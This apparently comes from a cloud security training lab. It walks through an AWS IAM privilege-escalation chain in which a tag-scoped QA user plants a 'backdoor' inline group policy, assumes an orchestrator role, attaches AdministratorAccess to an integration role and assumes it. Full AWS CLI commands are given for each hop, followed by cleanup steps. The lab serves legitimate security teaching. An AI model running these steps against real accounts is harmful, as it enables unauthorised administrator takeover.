# Lab 10 — Self-Service Policy Tampering (Medium)

## Scenario

A mid-sized SaaS company, "Acme Cloud", grants its QA automation team self-service IAM rights so that team leads can iterate on group permissions without filing tickets. The QA platform's orchestrator role, in turn, is allowed to attach managed policies to a downstream integration role — the design intent being that the orchestrator chooses the *right* narrow policy as test fixtures evolve.

A junior QA automation engineer (`qa-automation-engineer-3`) holds tightly tag-scoped credentials. They cannot enumerate IAM resources outside `Team=qa-automation`. They have no `sts:AssumeRole` permissions of their own. They cannot read any secrets, contents, or runtime artifacts. Yet three layered IAM-only misconfigurations chain into administrator access — each one defensible in isolation, none individually granting the next hop, all together producing a full account compromise.

## Environment

| Category | Count | Details |
|----------|-------|---------|
| IAM Users | 29 | 5 QA automation, 5 QA platform, 6 engineering, 3 DevOps, 2 security, 3 data, 1 admin, plus chain entry point |
| IAM Roles | 14 | `qa-platform-orchestrator-role`, `qa-integration-service-role`, Lambda/ECS/Backup/GuardDuty/Config service roles, frontend deploy role, smoke-test role |
| IAM Groups | 6 | `qa-automation-team`, `qa-platform-team`, `engineering-team`, `devops-team`, `security-team`, `data-engineering-team` |
| Managed Policies | 2 | `discovery-team-qa-automation`, `discovery-team-qa-platform`, `QAIntegrationBaselinePolicy` |
| Lambda Functions | 3 | Pure noise — none read during the chain |
| EC2 Instances | 3 | Pure noise |
| S3 Buckets | 2 | Pure noise — not used in the chain |

The Lambda, EC2, and S3 resources exist only to make the environment look like a realistic enterprise. **No environment variables, no secret stores, no runtime contents, no out-of-band data sources are involved in the escalation.** Every step in the chain is authorised purely by an IAM policy evaluation.

## Progressive Visibility (Tag-Scoped Discovery)

Each principal in the chain is attached to a different discovery policy whose `iam:Get*` and fine-grained `List*` actions are gated on `aws:ResourceTag/Team`:

| Principal | Visible `Team` tags |
|-----------|---------------------|
| `qa-automation-engineer-3` (entry) | `qa-automation` |
| `qa-platform-orchestrator-role` (Hop 3 onward) | `qa-automation`, `qa-platform` |
| `qa-integration-service-role` (after policy attach) | `*:*` (admin) |

Coarse top-level `iam:ListUsers / ListRoles / ListGroups / ListPolicies` is allowed so name-level enumeration works at every step; **policy contents** are gated. From the entry user's perspective, `qa-platform-orchestrator-role` is visible by name but its policies cannot be introspected — the dangerous `iam:AttachRolePolicy` grant only becomes readable after the user has actually assumed the orchestrator.

## Vulnerability — Three Layered IAM Misconfigurations

### Misconfiguration 1 — `iam:PutGroupPolicy` on the attacker's own team group

The chain entry user holds:

```json
{
  "Action": ["iam:PutGroupPolicy", "iam:DeleteGroupPolicy",
             "iam:GetGroupPolicy", "iam:ListGroupPolicies"],
  "Resource": "arn:aws:iam::ACCOUNT_ID:group/qa-automation-team"
}
```

*Justification*: a "QA self-service" delegation lets team leads iterate on the group's permissions without filing IAM tickets. The Resource ARN is tightly scoped to a single group.

The flaw: an inline group policy can grant **any** action, including `sts:AssumeRole` on out-of-team roles. The Resource scoping limits *which group* can be modified, not *what* the modification can contain.

### Misconfiguration 2 — Group-inherited `sts:AssumeRole`

Once the entry user PUTs a new inline policy on `qa-automation-team` that includes:

```json
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::ACCOUNT_ID:role/qa-platform-orchestrator-role"
}
```

…every member of the group — including the entry user themselves — picks up the new permission via group membership. The `qa-platform-orchestrator-role` has a permissive trust policy (`"Principal": { "AWS": "arn:aws:iam::ACCOUNT_ID:root" }`), so any in-account principal with the IAM permission can assume it.

### Misconfiguration 3 — `iam:AttachRolePolicy` with unconstrained `PolicyArn`

`qa-platform-orchestrator-role` holds:

```json
{
  "Action": ["iam:AttachRolePolicy", "iam:DetachRolePolicy",
             "iam:ListAttachedRolePolicies"],
  "Resource": "arn:aws:iam::ACCOUNT_ID:role/qa-integration-service-role"
}
```

*Justification*: the orchestrator role is supposed to provision the right QA-scoped managed policy onto `qa-integration-service-role` as test fixtures evolve.

The flaw: there is no `iam:PolicyARN` condition restricting *which* policies may be attached. The AWS-managed `arn:aws:iam::aws:policy/AdministratorAccess` is trivially within scope. Once it's attached, `qa-integration-service-role` is account admin; the orchestrator was already pre-authorised in that role's trust policy.

## Attack Chain

```
qa-automation-engineer-3
    │
    │  iam:PutGroupPolicy on qa-automation-team
    │  insert inline policy: { Effect: Allow, Action: sts:AssumeRole,
    │                          Resource: qa-platform-orchestrator-role }
    ▼
qa-automation-team  (now grants sts:AssumeRole via group inheritance)
    │
    │  sts:AssumeRole
    ▼
qa-platform-orchestrator-role
    │
    │  iam:AttachRolePolicy
    │    --role-name qa-integration-service-role
    │    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    ▼
qa-integration-service-role  (now has AdministratorAccess attached)
    │
    │  sts:AssumeRole  (trust pre-authorises the orchestrator)
    ▼
                FULL ACCOUNT COMPROMISE
```

### Exploitation Steps

1. **Initial reconnaissance.** Configure AWS CLI with `qa-automation-engineer-3` credentials.
   ```bash
   aws sts get-caller-identity
   aws iam list-users                        # all names visible
   aws iam get-role --role-name qa-platform-orchestrator-role
   #   → AccessDenied (Team tag does not match)
   aws iam get-group --group-name qa-automation-team
   #   → visible (Team=qa-automation matches discovery scope)
   ```

2. **Hop 1 — backdoor the team's group policy.**
   ```bash
   cat > group-policy.json <<'EOF'
   {
     "Version": "2012-10-17",
     "Statement": [{
       "Effect": "Allow",
       "Action": "sts:AssumeRole",
       "Resource": "arn:aws:iam::ACCOUNT_ID:role/qa-platform-orchestrator-role"
     }]
   }
   EOF
   aws iam put-group-policy \
       --group-name qa-automation-team \
       --policy-name qa-self-service-backdoor \
       --policy-document file://group-policy.json
   ```

3. **Hop 2 — assume the orchestrator role.**
   ```bash
   aws sts assume-role \
       --role-arn arn:aws:iam::ACCOUNT_ID:role/qa-platform-orchestrator-role \
       --role-session-name pwn
   ```
   Configure a CLI profile (`orchestrator`) with the returned STS credentials. Re-run discovery — now `Team=qa-platform` tagged resources are introspectable, including the `qa-integration-service-role` and the orchestrator's own `iam:AttachRolePolicy` permission.

4. **Hop 3 — attach AdministratorAccess to the integration role.**
   ```bash
   aws iam attach-role-policy --profile orchestrator \
       --role-name qa-integration-service-role \
       --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
   ```

5. **Hop 4 — assume the now-administrator role.**
   ```bash
   aws sts assume-role --profile orchestrator \
       --role-arn arn:aws:iam::ACCOUNT_ID:role/qa-integration-service-role \
       --role-session-name admin-pwn
   ```
   The returned credentials have effective `AdministratorAccess` because `qa-integration-service-role` now has the AWS-managed admin policy attached.

## Why Each Hop Looks Benign

| Hop | Permission | Apparent Justification |
|-----|------------|------------------------|
| 1 | `iam:PutGroupPolicy` on `qa-automation-team` | Self-service delegation — team leads iterate on their own group's permissions |
| 2 | Group's new inline policy grants `sts:AssumeRole` | Looks like ordinary cross-team coordination |
| 3 | `iam:AttachRolePolicy` on `qa-integration-service-role` | Orchestrator role provisions narrow QA-scope policies onto the integration role |
| 4 | `sts:AssumeRole` from orchestrator to integration | Pre-authorised trust between two intentionally coupled roles |

Reviewed individually, every grant is defensible. The vulnerability emerges only when you observe that:

- **Resource scoping on `iam:PutGroupPolicy`** restricts *which* group can be edited, not *what* the edit can contain. An inline policy is unconstrained by the parent's resource scoping.
- **Resource scoping on `iam:AttachRolePolicy`** restricts *which* role can be modified, not *which* managed policies can be attached. `AdministratorAccess` is an AWS-managed policy and is in-scope by default.

These are two of the most common IAM scoping mistakes in real-world environments — and both pass standard policy review because each individual statement looks tightly scoped to a single resource.

## Difficulty: Medium

- **Three IAM misconfigurations across three distinct primitives** (`PutGroupPolicy`, group-inherited `sts:AssumeRole`, `AttachRolePolicy`).
- **No single policy is sufficient.** The entry user can't `AttachRolePolicy`; the orchestrator can't `PutGroupPolicy`. Only the combination escalates.
- **Tag-scoped discovery** hides the orchestrator's dangerous `AttachRolePolicy` grant from the entry user's static policy review.
- **Realistic enterprise scaffolding** (29 users, 6 teams, 14 roles, with Lambda/EC2/S3 noise) makes the chain participants indistinguishable from legitimate service roles on a name-only enumeration.

## Cleanup

```bash
# Before destroying, remove the inline policy you created during exploitation:
aws iam delete-group-policy \
    --group-name qa-automation-team \
    --policy-name qa-self-service-backdoor

# And detach AdministratorAccess if you attached it:
aws iam detach-role-policy \
    --role-name qa-integration-service-role \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

terraform destroy
```
